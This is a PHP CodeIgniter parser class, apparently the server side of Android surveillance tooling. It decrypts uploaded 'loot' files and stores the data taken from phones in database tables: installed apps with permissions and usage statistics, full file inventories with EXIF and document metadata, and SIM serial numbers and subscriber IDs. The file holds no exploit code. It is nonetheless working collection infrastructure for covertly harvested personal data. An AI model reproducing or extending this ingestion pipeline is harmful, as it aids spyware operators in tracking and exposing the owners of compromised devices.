<?php

namespace App\Libraries\Parsers;

use App\Models\CryptModel;
use Config\Database;

class LootSystemParser
{
    /**
     * @var \CodeIgniter\Database\BaseConnection
     */
    protected $db;

    /**
     * Constructor to inject or resolve the database.
     *
     * @param \CodeIgniter\Database\BaseConnection|null $db
     */
    public function __construct($db = null)
    {
        $this->db = $db ?? Database::connect();
    }

    /**
     * Parses and inserts apps from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function parseApps(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        try {
            $cryptModel = new CryptModel();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/raw_telemetry/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decrypt_file($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null) {
                log_message('error', 'Invalid JSON structure in apps file: ' . $file_name);
                return false;
            }
            $appsData = $json['installed_apps'] ?? $json['apps'] ?? null;
            if (!is_array($appsData)) {
                log_message('error', 'Invalid JSON structure in apps file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $device_id = $json['device_id'] ?? $var_file_print;
            $device_model = $json['device_model'] ?? null;
            $android_version = $json['android_version'] ?? null;

            $batchData = [];
            foreach ($appsData as $app) {
                if (!isset($app['package_name']) || !isset($app['app_name'])) {
                    continue; // Skip invalid entries
                }

                $data = [
                    'package_name'                    => $app['package_name'],
                    'app_name'                        => $app['app_name'],
                    'version_name'                    => $app['version_name'] ?? null,
                    'version_code'                    => $app['version_code'] ?? null,
                    'first_install_time'              => $app['first_install_time'] ?? null,
                    'last_update_time'                => $app['last_update_time'] ?? null,
                    'installer_package_name'          => $app['installer_package_name'] ?? null,
                    'signatures_sha256'               => $app['signatures_sha256'] ?? null,
                    'cert_expiry'                     => $app['cert_expiry'] ?? null,
                    'is_system_app'                   => $app['is_system_app'] ? 1 : 0,
                    'is_instant_app'                  => $app['is_instant_app'] ? 1 : 0,
                    'is_archived'                     => $app['is_archived'] ? 1 : 0,
                    'is_suspended'                    => $app['is_suspended'] ? 1 : 0,
                    'hidden'                          => $app['hidden'] ? 1 : 0,
                    'disabled'                        => $app['disabled'] ? 1 : 0,
                    'category'                        => $app['category'] ?? null,
                    'target_sdk'                      => $app['target_sdk'] ?? null,
                    'min_sdk'                         => $app['min_sdk'] ?? null,
                    'permissions'                     => !empty($app['permissions']) ? json_encode($app['permissions']) : null,
                    'permission_count'                => $app['permission_count'] ?? 0,
                    'granted_runtime_permissions'     => !empty($app['granted_runtime_permissions']) ? json_encode($app['granted_runtime_permissions']) : null,
                    'denied_permissions'              => !empty($app['denied_permissions']) ? json_encode($app['denied_permissions']) : null,
                    'requested_permissions_flags'     => !empty($app['requested_permissions_flags']) ? json_encode($app['requested_permissions_flags']) : null,
                    'app_ops_mode'                    => $app['app_ops_mode'] ?? -1,
                    'activities'                      => !empty($app['activities']) ? json_encode($app['activities']) : null,
                    'services'                        => !empty($app['services']) ? json_encode($app['services']) : null,
                    'receivers'                       => !empty($app['receivers']) ? json_encode($app['receivers']) : null,
                    'providers'                       => !empty($app['providers']) ? json_encode($app['providers']) : null,
                    'native_libs'                     => !empty($app['native_libs']) ? json_encode($app['native_libs']) : null,
                    'abi'                             => !empty($app['abi']) ? json_encode($app['abi']) : null,
                    'uses_libraries'                  => !empty($app['uses_libraries']) ? json_encode($app['uses_libraries']) : null,
                    'app_size'                        => $app['app_size'] ?? 0,
                    'data_dir_size'                   => $app['data_dir_size'] ?? 0,
                    'cache_dir_size'                  => $app['cache_dir_size'] ?? 0,
                    'external_files_size'             => $app['external_files_size'] ?? 0,
                    'shared_prefs_count'              => $app['shared_prefs_count'] ?? 0,
                    'databases_count'                 => $app['databases_count'] ?? 0,
                    'last_used_time'                  => $app['last_used_time'] ?? null,
                    'first_launch_time'               => $app['first_launch_time'] ?? null,
                    'launch_count_30d'                => $app['launch_count_30d'] ?? 0,
                    'total_foreground_time_30d'       => $app['total_foreground_time_30d'] ?? null,
                    'owner_id'                        => $var_file_owner,
                    'device_id'                       => $device_id,
                    'device_model'                    => $device_model,
                    'android_version'                 => $android_version,
                    'extracted_at'                    => $extracted_at,
                    'created_at'                      => $dated,
                    'updated_at'                      => $dated,
                ];

                // Duplicate check: same package on same device for same user
                $exists = $this->db->table('tbl_extracted_installed_apps')
                        ->where('package_name', $data['package_name'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batchData[] = $data;
                } else {
                    // Update existing app info
                    $this->db->table('tbl_extracted_installed_apps')
                        ->where('package_name', $data['package_name'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->update([
                            'app_name'                        => $data['app_name'],
                            'version_name'                    => $data['version_name'],
                            'version_code'                    => $data['version_code'],
                            'last_update_time'                => $data['last_update_time'],
                            'installer_package_name'          => $data['installer_package_name'],
                            'signatures_sha256'               => $data['signatures_sha256'],
                            'cert_expiry'                     => $data['cert_expiry'],
                            'is_system_app'                   => $data['is_system_app'],
                            'is_instant_app'                  => $data['is_instant_app'],
                            'is_archived'                     => $data['is_archived'],
                            'is_suspended'                    => $data['is_suspended'],
                            'hidden'                          => $data['hidden'],
                            'disabled'                        => $data['disabled'],
                            'category'                        => $data['category'],
                            'target_sdk'                      => $data['target_sdk'],
                            'min_sdk'                         => $data['min_sdk'],
                            'permissions'                     => $data['permissions'],
                            'permission_count'                => $data['permission_count'],
                            'granted_runtime_permissions'     => $data['granted_runtime_permissions'],
                            'denied_permissions'              => $data['denied_permissions'],
                            'requested_permissions_flags'     => $data['requested_permissions_flags'],
                            'app_ops_mode'                    => $data['app_ops_mode'],
                            'activities'                      => $data['activities'],
                            'services'                        => $data['services'],
                            'receivers'                       => $data['receivers'],
                            'providers'                       => $data['providers'],
                            'native_libs'                     => $data['native_libs'],
                            'abi'                             => $data['abi'],
                            'uses_libraries'                  => $data['uses_libraries'],
                            'app_size'                        => $data['app_size'],
                            'data_dir_size'                   => $data['data_dir_size'],
                            'cache_dir_size'                  => $data['cache_dir_size'],
                            'external_files_size'             => $data['external_files_size'],
                            'shared_prefs_count'              => $data['shared_prefs_count'],
                            'databases_count'                 => $data['databases_count'],
                            'last_used_time'                  => $data['last_used_time'],
                            'first_launch_time'               => $data['first_launch_time'],
                            'launch_count_30d'                => $data['launch_count_30d'],
                            'total_foreground_time_30d'       => $data['total_foreground_time_30d'],
                            'extracted_at'                    => $data['extracted_at'],
                            'updated_at'                      => $dated,
                        ]);
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_extracted_installed_apps')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' apps from ' . $file_name);
            }

            return count($batchData);
        } catch (\Exception $e) {
            log_message('error', 'get_apps parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts device files from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int Record count or false
     */
    public function parseFiles(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        try {
            $cryptModel = new CryptModel();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/raw_telemetry/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decrypt_file($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null || !isset($json['files']) || !is_array($json['files'])) {
                log_message('error', 'Invalid JSON structure in files file: ' . $file_name);
                return false;
            }
            $extracted_at = $json['extracted_at'] ?? null;
            $batchData = [];

            foreach ($json['files'] as $file) {
                if (!isset($file['path'])) {
                    continue; // Skip invalid entries
                }

                $data = [
                    'name'           => $file['name'] ?? basename($file['path']),
                    'path'           => $file['path'],
                    'path_hash'      => sha1((string) $file['path']),
                    'is_directory'   => isset($file['is_directory']) && $file['is_directory'] ? 1 : 0,
                    'size_bytes'     => $file['size_bytes'] ?? 0,
                    'last_modified'  => $file['last_modified'] ?? null,
                    'extension'      => $file['extension'] ?? null,
                    'formatted_size' => $file['formatted_size'] ?? null,
                    'formatted_date' => $file['formatted_date'] ?? null,
                    'category'       => $file['category'] ?? null,
                    'mime_type'              => $file['mime_type'] ?? null,
                    'magic_bytes'            => $file['magic_bytes'] ?? null,
                    'entropy'                => $file['entropy'] ?? null,
                    'is_encrypted'           => isset($file['is_encrypted']) ? ($file['is_encrypted'] ? 1 : 0) : 0,
                    'hash_sha256'            => $file['hash_sha256'] ?? null,
                    'hash_md5'               => $file['hash_md5'] ?? null,
                    'exif_data'              => json_encode($file['exif_data'] ?? []),
                    'media_duration'         => $file['media_duration'] ?? null,
                    'media_resolution'       => $file['media_resolution'] ?? null,
                    'media_bitrate'          => $file['media_bitrate'] ?? null,
                    'media_codec'            => $file['media_codec'] ?? null,
                    'document_page_count'    => $file['document_page_count'] ?? null,
                    'document_author'        => $file['document_author'] ?? null,
                    'document_title'         => $file['document_title'] ?? null,
                    'document_subject'       => $file['document_subject'] ?? null,
                    'document_keywords'      => $file['document_keywords'] ?? null,
                    'archive_contents_list'  => json_encode($file['archive_contents_list'] ?? []),
                    'archive_encrypted'      => isset($file['archive_encrypted']) ? ($file['archive_encrypted'] ? 1 : 0) : 0,
                    'apk_package_name'       => $file['apk_package_name'] ?? null,
                    'apk_version_code'       => $file['apk_version_code'] ?? null,
                    'apk_min_sdk'            => $file['apk_min_sdk'] ?? null,
                    'apk_target_sdk'         => $file['apk_target_sdk'] ?? null,
                    'apk_permissions'        => json_encode($file['apk_permissions'] ?? []),
                    'apk_signatures'         => json_encode($file['apk_signatures'] ?? []),
                    'certificate_info'       => json_encode($file['certificate_info'] ?? []),
                    'is_hidden'              => isset($file['is_hidden']) ? ($file['is_hidden'] ? 1 : 0) : 0,
                    'is_system_file'         => isset($file['is_system_file']) ? ($file['is_system_file'] ? 1 : 0) : 0,
                    'selinux_context'        => $file['selinux_context'] ?? null,
                    'extended_attributes'    => json_encode($file['extended_attributes'] ?? []),
                    'hard_link_count'        => $file['hard_link_count'] ?? 0,
                    'inode_number'           => $file['inode_number'] ?? 0,
                    'mount_point'            => $file['mount_point'] ?? null,
                    'owner_id'       => $var_file_owner,
                    'device_id'      => $var_file_print,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                    'updated_at'     => $dated,
                ];

                // Duplicate check: Same path, device, and owner
                $exists = $this->db->table('tbl_extracted_device_files')
                        ->where('path_hash', $data['path_hash'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batchData[] = $data;
                } else {
                    // Start Update existing file info
                    $this->db->table('tbl_extracted_device_files')
                        ->where('path_hash', $data['path_hash'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->update([
                            'size_bytes'     => $data['size_bytes'],
                            'last_modified'  => $data['last_modified'],
                            'formatted_size' => $data['formatted_size'],
                            'formatted_date' => $data['formatted_date'],
                            'updated_at'     => $dated,
                        ]); 
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_extracted_device_files')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' files from ' . $file_name);
            }

            return count($batchData);
        } catch (\Exception $e) {
            log_message('error', 'get_files parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts SIM configs.
     *
     * @param string $file_name
     * @param int $ownerId
     * @param string $devicePrint
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function parseSimConfigs(string $file_name, int $ownerId, string $devicePrint, int $fileRecordId = null)
    {
        try {
            $cryptModel = new CryptModel();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/raw_telemetry/' . $file_name);
            if ($raw === false) {
                log_message('error', 'parse_sim_configs: failed to read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decrypt_file($raw);
            if ($decoded === false) {
                log_message('error', 'parse_sim_configs: failed to decode: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', 'parse_sim_configs: invalid JSON: ' . $file_name);
                return false;
            }

            $extractedAt = $json['extracted_at'] ?? null;
            $recordsInserted = 0;

            $entries = $json['sim_configs'] ?? $json['sim_config'] ?? [$json];
            if (isset($entries['sim_serial']) || isset($entries['subscriber_id'])) {
                $entries = [$entries];
            }

            foreach ($entries as $entry) {
                $data = [
                    'owner_id'        => $ownerId,
                    'device_id'       => $devicePrint,
                    'sim_serial'      => $entry['sim_serial'] ?? null,
                    'subscriber_id'   => $entry['subscriber_id'] ?? null,
                    'sim_operator_name' => $entry['sim_operator_name'] ?? $entry['operator_name'] ?? null,
                    'sim_country_iso'   => $entry['sim_country_iso'] ?? $entry['country_iso'] ?? null,
                    'sim_state'       => $entry['sim_state'] ?? $entry['state'] ?? null,
                    'phone_type'      => $entry['phone_type'] ?? $entry['phoneType'] ?? null,
                    'is_sim_changed'  => !empty($entry['is_sim_changed']) ? 1 : 0,
                    'captured_at'     => $entry['captured_at'] ?? $entry['timestamp'] ?? $extractedAt,
                    'extracted_at'    => $extractedAt,
                    'created_at'      => $dated,
                    'updated_at'      => $dated,
                ];

                if ($this->db->table('tbl_sim_configs')->insert($data)) {
                    $recordsInserted++;
                }
            }

            return $recordsInserted;

        } catch (\Exception $e) {
            log_message('error', 'parse_sim_configs exception: ' . $e->getMessage());
            return false;
        }
    }
}
